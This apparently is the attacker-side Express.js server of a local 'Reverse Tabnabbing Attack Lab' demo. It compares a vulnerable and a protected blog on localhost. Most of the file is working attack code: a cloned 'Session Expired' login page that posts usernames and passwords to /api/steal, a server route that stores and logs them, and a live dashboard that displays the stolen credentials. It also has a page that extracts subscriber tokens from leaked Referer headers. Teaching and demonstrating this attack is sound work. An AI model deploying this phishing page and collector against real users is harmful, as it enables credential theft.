/*
 * How to Run:
 *
 * Terminal 1: cd demo-attacked/reverse-tabnabbing && npm install && npm run vulnerable
 * Terminal 2: cd demo-attacked/reverse-tabnabbing && npm run guide
 *
 * Attack sequence:
 * 1. http://localhost:3016  ← TechBlog — click external article
 * 2. New tab loads this server (/) — silently redirects original tab to /phish
 * 3. Switch back → phishing login; submit credentials
 * 4. http://localhost:3017/dashboard  ← stolen credentials
 */

const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3017;
const VICTIM_PORT = 3016;
const PROTECTED_PORT = 3018;

app.use(cors());
app.use(express.static(path.join(__dirname, 'public'), { index: false }));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const stolenCredentials = [];

const NEWSLETTER_QUERY =
  'subscriber_id=ALEX_READER_TOKEN_f3a9c2b1&utm_campaign=q2_digest&utm_source=email';
const VULN_NEWSLETTER_URL =
  'http://localhost:' + VICTIM_PORT + '/newsletter?' + NEWSLETTER_QUERY;
const PROT_NEWSLETTER_URL =
  'http://localhost:' + PROTECTED_PORT + '/newsletter?' + NEWSLETTER_QUERY;

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function parseRefererUrl(referer) {
  const params = {};
  if (!referer) return { params: {}, subscriberId: null };

  try {
    const url = new URL(referer);
    url.searchParams.forEach(function (value, key) {
      params[key] = value;
    });
    return {
      params: params,
      subscriberId: params.subscriber_id || null,
    };
  } catch (err) {
    return { params: {}, subscriberId: null };
  }
}

function buildRefererArticleHtml(referer) {
  const hasReferer = referer && String(referer).trim();
  const parsed = parseRefererUrl(referer);

  let refererBox;
  if (hasReferer) {
    const paramRows = Object.keys(parsed.params).map(function (key) {
      return (
        '<tr><td>' + escapeHtml(key) + '</td><td>' + escapeHtml(parsed.params[key]) + '</td></tr>'
      );
    }).join('');

    const extractedToken = parsed.subscriberId
      ? escapeHtml(parsed.subscriberId)
      : '(not found in URL)';

    refererBox =
      '<div class="referer-box leaked">' +
        '<h2>🚨 REFERER HEADER RECEIVED</h2>' +
        '<p>Your browser told us you came from:</p>' +
        '<div class="referer-url">' + escapeHtml(referer) + '</div>' +
        '<p class="extracted">Extracted token: <strong>' + extractedToken + '</strong></p>' +
        '<p class="impact">This token is now in our access log. We can use it to identify you, ' +
        'unsubscribe you from TechBlog, or combine it with other tracking data.</p>' +
        (paramRows
          ? '<table class="param-table"><thead><tr><th>Parameter</th><th>Value</th></tr></thead><tbody>' +
            paramRows + '</tbody></table>'
          : '') +
      '</div>';
  } else {
    refererBox =
      '<div class="referer-box safe">' +
        '<h2>✅ NO REFERER RECEIVED</h2>' +
        '<p>Your browser sent no Referer header.</p>' +
        '<p><code>rel="noreferrer"</code> suppressed it.</p>' +
        '<p>We have no information about where you came from.</p>' +
      '</div>';
  }

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>How AI Is Reshaping Frontend Development — DevPulse</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: Georgia, 'Times New Roman', serif;
      background: #fafafa;
      color: #1a1a1a;
      line-height: 1.75;
    }
    .site-header {
      background: #fff;
      border-bottom: 1px solid #e5e5e5;
      padding: 1rem 2rem;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      font-weight: 700;
      font-size: 1.1rem;
      color: #333;
    }
    .referer-box {
      margin: 0;
      padding: 1.75rem 2rem;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      color: #fff;
    }
    .referer-box.leaked {
      background: #450a0a;
      border-bottom: 3px solid #dc2626;
    }
    .referer-box.safe {
      background: #052e16;
      border-bottom: 3px solid #16a34a;
    }
    .referer-box h2 {
      font-size: 1.15rem;
      margin-bottom: 1rem;
      letter-spacing: 0.02em;
    }
    .referer-box p { margin-bottom: 0.75rem; font-size: 0.95rem; line-height: 1.6; }
    .referer-url {
      background: rgba(0,0,0,0.25);
      border: 1px solid rgba(255,255,255,0.2);
      border-radius: 8px;
      padding: 1rem 1.25rem;
      font-family: 'Courier New', monospace;
      font-size: 0.85rem;
      word-break: break-all;
      margin: 1rem 0;
      line-height: 1.6;
    }
    .extracted { margin-top: 1rem; }
    .impact { opacity: 0.9; font-size: 0.9rem; }
    .param-table {
      width: 100%;
      max-width: 480px;
      border-collapse: collapse;
      margin-top: 1.25rem;
      font-size: 0.85rem;
    }
    .param-table th,
    .param-table td {
      text-align: left;
      padding: 0.5rem 0.75rem;
      border: 1px solid rgba(255,255,255,0.2);
    }
    .param-table th { background: rgba(0,0,0,0.2); }
    article {
      max-width: 680px;
      margin: 0 auto;
      padding: 2.5rem 1.5rem 4rem;
    }
    h1 { font-size: 2rem; line-height: 1.25; margin-bottom: 1rem; }
    .byline {
      font-family: -apple-system, sans-serif;
      font-size: 0.9rem;
      color: #666;
      margin-bottom: 2rem;
      padding-bottom: 1.5rem;
      border-bottom: 1px solid #e5e5e5;
    }
    p { margin-bottom: 1.25rem; font-size: 1.05rem; }
  </style>
</head>
<body>
  <div class="site-header">DevPulse · Independent Tech Journalism</div>
  ${refererBox}
  <article>
    <h1>How AI Is Reshaping Frontend Development</h1>
    <div class="byline">By Jordan Ellis · March 12, 2026 · Reading time: ~8 min</div>
    <p>The frontend landscape is changing faster than at any point since React's introduction in 2013. AI-assisted coding tools are no longer experimental — they are part of the daily workflow for millions of developers.</p>
    <p>Copilot-style autocomplete has evolved into full agentic workflows: describe a feature in plain English, receive a pull request. Design-to-code tools convert Figma frames into component libraries with surprising accuracy.</p>
    <p>Teams adopting these tools report mixed results. Junior developers ship faster but sometimes miss architectural implications. Senior engineers use AI for boilerplate while reserving judgment calls for themselves.</p>
    <p>What hasn't changed is the need for strong fundamentals. Understanding the DOM, accessibility, and performance still separates maintainable code from generated slop.</p>
  </article>
</body>
</html>`;
}

const SWITCHER_CSS = `
    .target-switcher {
      position: fixed;
      bottom: 1rem;
      left: 1rem;
      display: flex;
      gap: 0.5rem;
      z-index: 9999;
    }
    .target-switcher button {
      padding: 0.4rem 0.85rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid;
    }
    .target-switcher .btn-vulnerable {
      background: #1e293b;
      color: #fff;
      border-color: #334155;
    }
    .target-switcher .btn-vulnerable.active {
      background: #fff;
      color: #1e293b;
      border-color: #fff;
    }
    .target-switcher .btn-protected {
      background: #16a34a;
      color: #fff;
      border-color: #16a34a;
    }
    .target-switcher .btn-protected.active {
      background: #15803d;
      color: #fff;
      border-color: #ef4444;
    }`;

const SWITCHER_HTML = `
  <div class="target-switcher">
    <button type="button" class="btn-vulnerable active" id="btn-vulnerable">Vulnerable (:3016)</button>
    <button type="button" class="btn-protected" id="btn-protected">Protected (:3018)</button>
  </div>`;

const SWITCHER_JS = `
    document.getElementById('btn-vulnerable').addEventListener('click', function () {
      window.open('http://localhost:${VICTIM_PORT}', '_blank');
      document.getElementById('btn-vulnerable').classList.add('active');
      document.getElementById('btn-protected').classList.remove('active');
    });
    document.getElementById('btn-protected').addEventListener('click', function () {
      window.open('http://localhost:${PROTECTED_PORT}', '_blank');
      document.getElementById('btn-protected').classList.add('active');
      document.getElementById('btn-vulnerable').classList.remove('active');
    });`;

const PHISH_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TechBlog — Tech News &amp; Insights</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #fff;
      color: #1e293b;
      min-height: 100vh;
    }
    .demo-banner {
      background: #ffedd5;
      border-bottom: 2px solid #ea580c;
      color: #9a3412;
      padding: 0.6rem 1.5rem;
      font-size: 0.85rem;
      text-align: center;
      font-weight: 500;
      filter: blur(3px);
      opacity: 0.5;
    }
    header {
      border-bottom: 1px solid #e2e8f0;
      padding: 0 2rem;
      height: 64px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      max-width: 1100px;
      margin: 0 auto;
      filter: blur(2px);
      opacity: 0.6;
    }
    .logo { font-size: 1.35rem; font-weight: 700; color: #0f172a; }
    nav { display: flex; gap: 1.75rem; }
    nav a { color: #64748b; text-decoration: none; font-size: 0.9rem; }
    .user-badge {
      background: #f0fdfa;
      color: #0f766e;
      border: 1px solid #99f6e4;
      padding: 0.35rem 0.85rem;
      border-radius: 999px;
      font-size: 0.85rem;
      font-weight: 600;
    }
    main {
      max-width: 1100px;
      margin: 0 auto;
      padding: 2.5rem 2rem;
      filter: blur(4px);
      opacity: 0.45;
      pointer-events: none;
    }
    .page-title { font-size: 1.75rem; font-weight: 700; margin-bottom: 2rem; }
    .article-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 1.5rem;
    }
    .article-card {
      border: 1px solid #e2e8f0;
      border-radius: 12px;
      padding: 1.5rem;
      background: #fff;
    }
    .article-card h2 { font-size: 1rem; margin-bottom: 0.5rem; }
    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(15, 23, 42, 0.55);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
      z-index: 100;
    }
    .modal {
      background: #fff;
      border-radius: 16px;
      padding: 2.5rem;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 24px 64px rgba(0,0,0,0.2);
    }
    .modal h2 {
      font-size: 1.35rem;
      margin-bottom: 0.5rem;
      color: #0f172a;
    }
    .modal p {
      color: #64748b;
      font-size: 0.9rem;
      margin-bottom: 1.75rem;
      line-height: 1.6;
    }
    label {
      display: block;
      font-size: 0.8rem;
      font-weight: 600;
      color: #475569;
      margin-bottom: 0.35rem;
    }
    input {
      width: 100%;
      padding: 0.7rem 0.9rem;
      border: 1px solid #cbd5e1;
      border-radius: 8px;
      font-size: 0.95rem;
      margin-bottom: 1rem;
    }
    input:focus { outline: 2px solid #0d9488; border-color: #0d9488; }
    .btn-signin {
      width: 100%;
      background: #0d9488;
      color: #fff;
      border: none;
      padding: 0.85rem;
      border-radius: 8px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      margin-top: 0.5rem;
    }
    .btn-signin:hover { background: #0f766e; }
    .modal-footer {
      margin-top: 1.5rem;
      text-align: center;
      font-size: 0.75rem;
      color: #94a3b8;
    }
  </style>
</head>
<body>
  <div class="demo-banner">⚠️ VULNERABLE: External links use rel="opener"</div>
  <header>
    <div class="logo">TechBlog 📰</div>
    <nav><a href="#">Home</a><a href="#">Topics</a><a href="#">Newsletter</a></nav>
    <div class="user-badge">👤 Alex Reader</div>
  </header>
  <main>
    <h1 class="page-title">Latest Articles</h1>
    <div class="article-grid">
      <div class="article-card"><h2>The Hidden Cost of Technical Debt</h2></div>
      <div class="article-card"><h2>How AI Is Reshaping Frontend Development</h2></div>
      <div class="article-card"><h2>Building Resilient Microservices</h2></div>
      <div class="article-card"><h2>CSS Container Queries in Production</h2></div>
    </div>
  </main>

  <div class="overlay">
    <div class="modal">
      <h2>Session Expired</h2>
      <p>Your session has timed out for security. Please sign in to continue.</p>
      <form id="phish-form" method="POST" action="/api/steal">
        <label for="username">Email</label>
        <input type="text" id="username" name="username" value="alex.reader@email.com" autocomplete="username">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password" required>
        <button type="submit" class="btn-signin">Sign In</button>
      </form>
      <div class="modal-footer">© TechBlog · Privacy · Terms</div>
    </div>
  </div>

  <script>
    document.getElementById('phish-form').addEventListener('submit', function (e) {
      e.preventDefault();
      var form = e.target;
      var data = new FormData(form);
      fetch('/api/steal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: data.get('username'),
          password: data.get('password')
        })
      }).then(function () {
        window.location.href = 'http://localhost:${VICTIM_PORT}';
      });
    });
  </script>
</body>
</html>`;

const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Reverse Tabnabbing Attack Lab</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Courier New', Courier, monospace;
      background: #0a0a0a;
      color: #00ff41;
      min-height: 100vh;
      padding: 2rem;
    }
    h1 {
      font-size: 1.4rem;
      margin-bottom: 0.5rem;
      text-shadow: 0 0 8px rgba(0, 255, 65, 0.4);
    }
    .subtitle { color: #4ade80; margin-bottom: 2rem; font-size: 0.9rem; }
    .flow-box {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-bottom: 2rem;
      line-height: 1.9;
      font-size: 0.9rem;
      max-width: 720px;
    }
    .flow-box strong { color: #facc15; }
    .credentials-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
    }
    .credentials-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 0.85rem;
    }
    th {
      text-align: left;
      padding: 0.6rem 0.75rem;
      border-bottom: 1px solid #1a3a1a;
      color: #64748b;
      font-weight: 600;
    }
    td {
      padding: 0.75rem;
      border-bottom: 1px solid #0d1f0d;
      word-break: break-all;
    }
    .empty-state {
      color: #64748b;
      font-style: italic;
      padding: 1rem 0;
    }
    .entry-new { animation: glow 0.6s ease-out; }
    @keyframes glow {
      0% { background: rgba(0, 255, 65, 0.15); }
      100% { background: transparent; }
    }
    .referer-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-top: 2rem;
    }
    .referer-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .referer-panel p {
      font-size: 0.85rem;
      color: #94a3b8;
      line-height: 1.7;
      margin-bottom: 1.25rem;
      max-width: 640px;
    }
    .demo-buttons {
      display: flex;
      flex-wrap: wrap;
      gap: 0.75rem;
    }
    .demo-btn {
      background: #1e293b;
      color: #e2e8f0;
      border: 1px solid #334155;
      padding: 0.55rem 1rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      font-family: 'Courier New', Courier, monospace;
    }
    .demo-btn:hover { background: #334155; }
    .demo-btn.primary { background: #0d9488; border-color: #0d9488; color: #fff; }
    .demo-btn.primary:hover { background: #0f766e; }
    ${SWITCHER_CSS}
  </style>
</head>
<body>
  <h1>Reverse Tabnabbing Attack Lab</h1>
  <p class="subtitle">window.opener lets a new tab silently redirect the page that opened it</p>

  <div class="flow-box">
    <strong>Attack flow:</strong><br>
    1. Victim reads TechBlog at <strong>localhost:${VICTIM_PORT}</strong><br>
    2. Clicks external article — opens <strong>localhost:${PORT}</strong> in new tab<br>
    3. Attacker page runs <code>window.opener.location = '/phish'</code><br>
    4. Victim switches back — original tab now shows phishing login<br>
    5. Victim submits credentials — they appear in the table below
  </div>

  <div class="credentials-panel">
    <h2>Stolen Credentials</h2>
    <div id="table-wrap">
      <p class="empty-state" id="empty-state">Waiting for victim to submit credentials...</p>
      <table id="creds-table" style="display:none;">
        <thead>
          <tr><th>Username</th><th>Password</th><th>Timestamp</th></tr>
        </thead>
        <tbody id="creds-body"></tbody>
      </table>
    </div>
  </div>

  <div class="referer-panel">
    <h2>Referer Leak Demo</h2>
    <p>
      Open the vulnerable or protected TechBlog newsletter page, then click the article link.
      The <code>/article</code> page shows whether the <code>subscriber_id</code> token was received
      in the Referer header.
    </p>
    <div class="demo-buttons">
      <button type="button" class="demo-btn" id="btn-vuln-newsletter">Open Vulnerable TechBlog Newsletter</button>
      <button type="button" class="demo-btn" id="btn-prot-newsletter">Open Protected TechBlog Newsletter</button>
      <button type="button" class="demo-btn primary" id="btn-article">Open Article Page</button>
    </div>
  </div>

  ${SWITCHER_HTML}

  <script>
    var knownCount = 0;

    function formatTimestamp(iso) {
      var d = new Date(iso);
      var pad = function (n) { return String(n).padStart(2, '0'); };
      return d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()) + ' ' +
        pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
    }

    function renderCredentials(entries) {
      var empty = document.getElementById('empty-state');
      var table = document.getElementById('creds-table');
      var tbody = document.getElementById('creds-body');

      if (entries.length === 0) {
        empty.style.display = 'block';
        table.style.display = 'none';
        knownCount = 0;
        return;
      }

      empty.style.display = 'none';
      table.style.display = 'table';

      if (entries.length > knownCount) {
        tbody.innerHTML = '';
        entries.forEach(function (entry, index) {
          var tr = document.createElement('tr');
          if (index === 0 && entries.length > knownCount) tr.className = 'entry-new';
          tr.innerHTML =
            '<td>' + entry.username + '</td>' +
            '<td>' + entry.password + '</td>' +
            '<td>' + formatTimestamp(entry.timestamp) + '</td>';
          tbody.appendChild(tr);
        });
        knownCount = entries.length;
      }
    }

    function poll() {
      fetch('/api/stolen')
        .then(function (res) { return res.json(); })
        .then(renderCredentials)
        .catch(function (err) { console.error('Poll failed:', err); });
    }

    poll();
    setInterval(poll, 3000);

    document.getElementById('btn-vuln-newsletter').addEventListener('click', function () {
      window.open('${VULN_NEWSLETTER_URL}', '_blank');
    });
    document.getElementById('btn-prot-newsletter').addEventListener('click', function () {
      window.open('${PROT_NEWSLETTER_URL}', '_blank');
    });
    document.getElementById('btn-article').addEventListener('click', function () {
      window.open('http://localhost:${PORT}/article', '_blank');
    });

    ${SWITCHER_JS}
  </script>
</body>
</html>`;

app.get('/', function (req, res) {
  res.sendFile(path.join(__dirname, 'public', 'guide.html'));
});

app.get('/phish', function (req, res) {
  res.send(PHISH_HTML);
});

app.get('/article', function (req, res) {
  const referer = req.headers.referer || req.headers.referrer || null;
  if (referer) {
    console.log('[REFERER] Received: ' + referer);
  } else {
    console.log('[REFERER] No Referer header received');
  }
  res.send(buildRefererArticleHtml(referer));
});

app.post('/api/steal', function (req, res) {
  const username = req.body.username || req.body.email || '';
  const password = req.body.password || '';

  if (username || password) {
    stolenCredentials.unshift({
      username: username,
      password: password,
      timestamp: new Date().toISOString(),
      userAgent: req.headers['user-agent'] || '',
    });
    console.log('[STOLEN] Credentials: ' + username + ' / ' + password);
  }

  res.json({ success: true });
});

app.get('/api/stolen', function (req, res) {
  res.json(stolenCredentials);
});

app.get('/dashboard', function (req, res) {
  res.send(DASHBOARD_HTML);
});

app.listen(PORT, function () {
  console.log('Reverse tabnabbing attacker running at http://localhost:' + PORT);
  console.log('Dashboard: http://localhost:' + PORT + '/dashboard');
  console.log('Fake article: http://localhost:' + PORT + '/');
  console.log('Referer demo article: http://localhost:' + PORT + '/article');
});
